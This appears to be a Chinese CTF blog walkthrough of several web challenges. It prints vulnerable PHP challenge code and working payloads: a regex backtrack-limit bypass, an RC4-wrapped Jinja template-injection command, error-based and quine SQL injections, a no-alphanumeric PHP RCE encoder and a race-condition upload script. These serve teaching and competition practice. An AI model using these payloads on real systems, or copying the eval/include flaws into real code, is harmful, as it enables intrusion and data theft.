<p>随后，压缩成压缩包，上传，得到的路径，用phar伪协议读取。</p>
<p>如下图所示，至于为何这里后面只添加了shell，是因为题目代码会自动加上php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157087.png" alt="image-20240719184321766"></p>
<h2 id="middlerce">middlerce</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"check.php"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'letter'</span>])){
    <span class="hljs-variable">$txw4ever</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'letter'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\{|\x09|\x0a|\[).*$/m'</span>,<span class="hljs-variable">$txw4ever</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"再加把油喔"</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$command</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$txw4ever</span>,<span class="hljs-literal">true</span>)[<span class="hljs-string">'cmd'</span>];
        <span class="hljs-title function_ invoke__">checkdata</span>(<span class="hljs-variable">$command</span>);
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$command</span>);
    }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>一个是绕过正则，另一个是要符合json数据的格式。</p>
<p>正则的话，见多了就知道这里是回溯次数限制绕过</p>
<pre><code class="hljs scss">PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre<span class="hljs-selector-class">.backtrack_limit</span>默认<span class="hljs-number">1000000</span>，超过<span class="hljs-number">1000000</span>不会返回<span class="hljs-number">1</span>或<span class="hljs-number">0</span>而是false即超过限制即可。</code></pre>
<p>脚本如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests

payload = <span class="hljs-string">'{"cmd":"cmd", "a":"'</span>+<span class="hljs-string">'#'</span>*<span class="hljs-number">1000000</span>+<span class="hljs-string">'"}'</span>
res = requests.post(<span class="hljs-string">"http://node4.anna.nssctf.cn:28035/"</span>,data = {<span class="hljs-string">"letter"</span>:payload})
<span class="hljs-built_in">print</span>(res.text)</code></pre>
<h2 id="is-secret">is secret</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157088.png" alt="image-20240719194835047"></p>
<p>首页让你找secret，扫目录看一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157089.png" alt="image-20240719194859050"></p>
<p>访问secret，发现可以给secret传参，然后胡乱传参，报错，看到下面的部分源码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157090.png" alt="image-20240719194826442"></p>
<p>经过RC4的解密然后加密，在经过safe的过滤，随后进行模板渲染</p>
<p>加密脚本如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key = <span class="hljs-string">"init_key"</span>, message = <span class="hljs-string">"init_message"</span></span>):
    <span class="hljs-comment"># print("RC4加密主函数")</span>
    s_box = rc4_init_sbox(key)
    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))
    <span class="hljs-keyword">return</span>  crypt
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):
    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <span class="hljs-comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span>
    <span class="hljs-comment"># print("原来的 s 盒：%s" % s_box)</span>
    j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span>
        s_box[i], s_box[j] = s_box[j], s_box[i]
    <span class="hljs-comment"># print("混乱后的 s 盒：%s"% s_box)</span>
    <span class="hljs-keyword">return</span> s_box
<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):
    <span class="hljs-comment"># print("调用加密程序成功。")</span>
    res = []
    i = j = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + box[i]) % <span class="hljs-number">256</span>
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % <span class="hljs-number">256</span>
        k = box[t]
        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))
    <span class="hljs-comment"># print("res用于加密字符串，加密后是：%res" %res)</span>
    cipher = <span class="hljs-string">""</span>.join(res)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"加密后的字符串是：%s"</span> %quote(cipher))
    <span class="hljs-comment">#print("加密后的输出(经过编码):")</span>
    <span class="hljs-comment">#print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))</span>
    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">'utf-8'</span>)), <span class="hljs-string">'utf-8'</span>))
<span class="hljs-comment">#需要加密的字符串在这里修改</span>
rc4_main(<span class="hljs-string">"HereIsTreasure"</span>,<span class="hljs-string">"{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat /flag.txt').read()\")}}{% endif %}{% endfor %}"</span>)
<span class="hljs-comment"># rc4_main("HereIsTreasure","{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('cat /proc/self/cgroup').read()}}")</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157091.png" alt="image-20240719195244852"></p>
<h2 id="join-us">join-us</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157092.png" alt="image-20240719212046082"></p>
<p>注入点就是登录框，抓包后尝试添加单引号发现抱错，说明存在sql注入了</p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>'#回显与<span class="hljs-number">1</span>相同，说明是单引号闭合</code></pre>
<p>由于fuzz了一波，发现and、union、database给ban了。尝试找一个不存在的表名，如下图得到数据库名字</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157094.png" alt="image-20240719211903839"></p>
<p>接下来就好办了</p>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select group_concat(table_name)from information_schema<span class="hljs-selector-class">.tables</span> where table_schema like 'sqlsql')))#</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157095.png" alt="image-20240719212336980"></p>
<p>接下来就是找column列名了，但是column被ban了，能找到join无列名注入</p>
<pre><code class="hljs scss">原理是用 join 连接两张表时, 遇到重复的列名会报错, 并把这个报错的列名显示出来</code></pre>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select * from (select * from output a join output b)c)))#</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157096.png" alt="image-20240719212902902"></p>
<p>找到data列名，接下来输出内容</p>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select data from output)))#
<span class="hljs-comment">//在此只有一个列名的情况下，直接查sqlsql.output也可</span></code></pre>
<p>同时由于回显不全，得利用截断字符，但只有mid没有被ban</p>
<pre><code class="hljs scss">tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,mid((select * from sqlsql.output),<span class="hljs-number">15</span>)))#

tt=<span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>or<span class="hljs-comment">/**/</span><span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>,mid(concat(<span class="hljs-number">0</span>x7e,(select * from sqlsql.output)),<span class="hljs-number">20</span>,<span class="hljs-number">30</span>))#</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157097.png" alt="image-20240719213640185"></p>
<pre><code class="hljs scss">NSSCTF{<span class="hljs-number">19</span>d1b58b-c3f0-<span class="hljs-number">4</span>bcc-<span class="hljs-number">8</span>c01-<span class="hljs-number">5392</span>f75122ff}</code></pre>
<h3 id="参考文章">参考文章</h3>
<p><a target="_blank" rel="noopener" href="https://exp10it.io/2022/08/mysql-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/#joinusing">MySQL 无列名注入的几种方式</a></p>
<h2 id="hardsql">hardsql</h2>
<pre><code class="hljs scss">password=_POST<span class="hljs-selector-attr">[<span class="hljs-string">'passwd'</span>]</span>;
sql="SELECT passwd FROM users WHERE username= 'bilala' and passwd = 'password';";</code></pre>
<p>题目给出提示如上</p>
<p>尝试抓包进行注入的时候，提示我们用户名只能是bilala，那说明只能给passwd注入了，根据提示能猜到这里是个空表，那我们只能让查询的结果与输入的结果一致才行。</p>
<p>那就能想到quine注入了，参考文章可以看下面这个：</p>
<p><a target="_blank" rel="noopener" href="https://peekaboo.show/loginmaster/">[HDCTF 2023]Login Master 复现</a></p>
<pre><code class="hljs scss"><span class="hljs-number">1</span>'<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-built_in">replace</span>(replace('<span class="hljs-number">1</span>"/**/union/**/select/**/replace(replace(".",chr(<span class="hljs-number">34</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),".")#',<span class="hljs-built_in">chr</span>(<span class="hljs-number">34</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),'<span class="hljs-number">1</span>"<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-built_in">replace</span>(replace(".",chr(<span class="hljs-number">34</span>),<span class="hljs-built_in">chr</span>(<span class="hljs-number">39</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">46</span>),".")#')#</code></pre>
<p>最后就是上面这个payload，只不过原本是char，但被ban了。查询可以知道chr与0x三者等价</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157098.png" alt="image-20240719215006671"></p>
<h1 id="鹏城杯-2022">鹏城杯 2022</h1>
<h2 id="简单包含">简单包含</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"flag"</span>]);
<span class="hljs-comment">//flag in /var/www/html/flag.php;</span></code></pre>
<p>首先给出源码如上，当我尝试直接读取flag.php，发现有waf，那我们读一下index.php，得到下面的代码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">"flag"</span>];

<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'php://input'</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/flag/'</span>, <span class="hljs-variable">$path</span>)) {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'nssctf waf!'</span>;
} <span class="hljs-keyword">else</span> {
    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>因为他这里是&amp;&amp;条件，那如果我们post的数据大于800，那if语句直接就是false，绕过flag的正则匹配，也就是要我们添加脏数据<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407291748064.png" alt></p>
<h2 id="简单的php">简单的php</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'code'</span>];
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>) &gt; <span class="hljs-number">80</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is'</span>,<span class="hljs-variable">$code</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">' Hello'</span>);
    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">';'</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/[^\s\(\)]+?\((?R)?\)/'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$code</span>)){
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);

    }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>针对第一个if语句，如果我们的代码长度在80以内，并且不包含任何数字字母以及特殊字符，即可绕过正则到达第二个if语句</p>
<p>针对第二个if语句的正则：</p>
<pre><code class="hljs scss">正则表达式 /<span class="hljs-selector-attr">[^\W]</span>+\((?R)?\)/：

^<span class="hljs-selector-attr">[^\W]</span>+：匹配一个或多个非非单词字符（即匹配一个或多个单词字符，相当于 <span class="hljs-selector-attr">[a-zA-Z0-9_]</span>）。
\(：匹配一个左括号 (。
(?R)：递归地匹配整个正则表达式本身。这意味着它会匹配嵌套的括号对。
\)：匹配一个右括号 )。
preg_replace：

这个函数将匹配正则表达式的部分替换为空字符串 ''。</code></pre>
<p>也就是说，我们只能使用不带参数的函数，这样才能匹配正则，执行eval代码</p>
<blockquote>
<p>前置知识：!%FF被用作内部函数之间的隔离符。这是因为在 URL 编码中，%FF通常是被认为是无效字符的，因为它超出了 ASCII 字符集的范围。因此，使用!%FF作为隔离符可以确保函数调用中的字符不会被错误地解析或转换。同理可以使用的也有 %8F 等，ASCII 字符集的范围 0-127。</p>
</blockquote>
<pre><code class="hljs python">exp = <span class="hljs-string">""</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">urlbm</span>(<span class="hljs-params">s</span>):
    ss = <span class="hljs-string">""</span>
    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> s:
        ss += <span class="hljs-string">"%"</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">255</span> - <span class="hljs-built_in">ord</span>(each)))[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">return</span> <span class="hljs-string">f"[~<span class="hljs-subst">{ss}</span>][!%FF]("</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    fun = <span class="hljs-built_in">input</span>(<span class="hljs-string">"Firebasky&gt;: "</span>).strip(<span class="hljs-string">")"</span>).split(<span class="hljs-string">"("</span>)
    exp = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> fun[:-<span class="hljs-number">1</span>]:
        exp += urlbm(each)
        <span class="hljs-built_in">print</span>(exp)
    exp += <span class="hljs-string">")"</span> * (<span class="hljs-built_in">len</span>(fun) - <span class="hljs-number">1</span>) + <span class="hljs-string">";"</span>
    <span class="hljs-built_in">print</span>(exp)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407291748065.png" alt><br>
提交即可<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407291748066.png" alt></p>
<h3 id="参考文章">参考文章</h3>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9360?time__1311=n4%2BxnD0DuAKCqiKi%3DtDsA3o4rt4Y5DkCSD0oTD#toc-3">PHP的无参数RCE</a><br>
<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11929?time__1311=Cq0xuD2Dg0i%3DDsD7zAxiKkl4jxiuATx4rD#toc-4">从CTFShow[RCE挑战]中学习无字母数字构造webshell</a></p>
<h2 id="压缩包">压缩包</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">removedir</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>)</span>{
    <span class="hljs-variable">$list</span>= <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$list</span> <span class="hljs-keyword">as</span>  <span class="hljs-variable">$value</span>) {
       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$value</span>)){
         <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$value</span>);
       }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>!=<span class="hljs-string">"."</span>&amp;&amp;<span class="hljs-variable">$value</span>!=<span class="hljs-string">".."</span>){
                <span class="hljs-title function_ invoke__">removedir</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">'/'</span>.<span class="hljs-variable">$value</span>);
       }
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unzip</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{
        <span class="hljs-variable">$result</span> = [];
        <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();
        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>);
        <span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'DOCUMENT_ROOT'</span>].<span class="hljs-string">"/static/upload/"</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$filename</span>);
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)){
            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);
        }
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">extractTo</span>(<span class="hljs-variable">$dir</span>)){
        <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$dir</span>) <span class="hljs-keyword">as</span>  <span class="hljs-variable">$value</span>) {
            <span class="hljs-variable">$file_ext</span>=<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$value</span>, <span class="hljs-string">'.'</span>);
            <span class="hljs-variable">$file_ext</span>=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
            <span class="hljs-variable">$file_ext</span>=<span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
            <span class="hljs-variable">$file_ext</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span>
            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">"/"</span>.<span class="hljs-variable">$value</span>)&amp;&amp;<span class="hljs-variable">$value</span>!=<span class="hljs-string">"."</span>&amp;&amp;<span class="hljs-variable">$value</span>!=<span class="hljs-string">".."</span>){
                <span class="hljs-title function_ invoke__">removedir</span>(<span class="hljs-variable">$dir</span>);
            }
            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/jpg|png|gif|jpeg/is"</span>,<span class="hljs-variable">$file_ext</span>)){
                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">"/"</span>.<span class="hljs-variable">$value</span>)){
                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">"/"</span>.<span class="hljs-variable">$value</span>);
                }<span class="hljs-keyword">else</span>{
                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$value</span>!=<span class="hljs-string">"."</span>&amp;&amp;<span class="hljs-variable">$value</span>!=<span class="hljs-string">".."</span>)
                    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$result</span>,<span class="hljs-variable">$value</span>);
                }
                
            }
           
        }
        <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();
        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$result</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
<span class="hljs-variable">$content</span>= <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'content'</span>];
<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">'rm -rf /tmp/*'</span>);
<span class="hljs-variable">$fpath</span> =<span class="hljs-string">"/tmp/"</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$content</span>); 
<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$fpath</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$content</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unzip</span>(<span class="hljs-variable">$fpath</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>总体来说就是对上传的压缩包进行解压，然后删除其中不合法文件，最后移动完上传的文件，然后删除该文件所在临时目录。</p>
<p>基于这一点，我们可以采用条件竞争或者上传一个不合法（损坏）的压缩包，这样就不会进入if语句而被删除</p>
<p>但却没有复现成功</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">import</span> base64
 
url = <span class="hljs-string">"http://1.14.71.254:28755/"</span>
sess=requests.session()
r = <span class="hljs-built_in">open</span>(<span class="hljs-string">"1.zip"</span>, <span class="hljs-string">"rb"</span>).read()
content = base64.b64encode(r)
data={
    <span class="hljs-string">'content'</span>: content
}
m=hashlib.md5(content)
md=hashlib.md5((<span class="hljs-string">'/tmp/'</span>+<span class="hljs-built_in">str</span>(m.digest().<span class="hljs-built_in">hex</span>())).encode())
<span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        resp=session.post(url,data=data)
<span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        resp=session.get(url+<span class="hljs-string">f'static/upload/<span class="hljs-subst">{md}</span>/1.php'</span>)
        <span class="hljs-keyword">if</span> resp.status_code==<span class="hljs-number">200</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"success"</span>)
<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    event = threading.Event()
    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):
            threading.Thread(target=write, args=(session,)).start()
 
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):
            threading.Thread(target=read, args=(session,)).start()
    event.<span class="hljs-built_in">set</span>()</code></pre>
<h1 id="红明谷ctf-2022">红明谷CTF 2022</h1>
<h2 id="smarty-calculator">Smarty Calculator</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041483.png" alt></p>
<p>首先扫描目录发现源码，打开之后先看index.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408052041484.png" alt></p>
<p>可以看到这里有个waf，过滤了php、flag、?、&lt;；字符，然后当我们的data和login参数都存在，即可进行smarty的模板渲染。</p>
<p>那首先获取一下当前版本：3.1.39</p>
